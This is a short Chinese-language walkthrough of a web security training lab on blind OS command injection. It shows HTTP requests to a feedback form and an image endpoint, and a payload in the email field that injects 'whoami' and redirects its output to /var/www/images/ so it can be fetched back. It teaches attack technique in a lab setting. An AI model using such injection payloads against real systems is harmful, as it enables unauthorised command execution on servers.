# 实验：具有输出重定向的盲注 OS 命令注入

本实验在反馈功能中包含一个盲注操作系统命令注入漏洞。

应用程序执行一个包含用户提供的详细信息的 shell 命令。该命令的输出不会在响应中返回。但是，你可以使用输出重定向来捕获命令的输出。存在一个可写文件夹位于：

```
/var/www/images/
```

应用程序从此位置提供产品目录的图片。你可以将注入命令的输出重定向到此文件夹中的文件，然后使用图片加载 URL 来检索文件的内容。

为了解决本实验，请执行 `whoami` 命令并检索输出。

## 步骤

探测
- 使用反馈功能

    ```http
    POST /feedback/submit HTTP/2

    csrf=VQrcgjNHtMhlJ7ibGz5f3lTPl3MqopMs&name=a&email=a%40b&subject=c&message=d
    ```
- 查看图片端点

    ```http
    GET /image?filename=53.jpg HTTP/2
    ```

测试
- 在反馈功能表单的 email 参数测试重定向

    ```http
    csrf=VQrcgjNHtMhlJ7ibGz5f3lTPl3MqopMs&name=a&email=a%40b<@urlencode>& whoami > /var/www/images/whoami.txt &</@urlencode>&subject=c&message=d
    ```

- 在图片端点访问载荷输出文件

    ```http
    GET /image?filename=whoami.txt HTTP/2
    ```
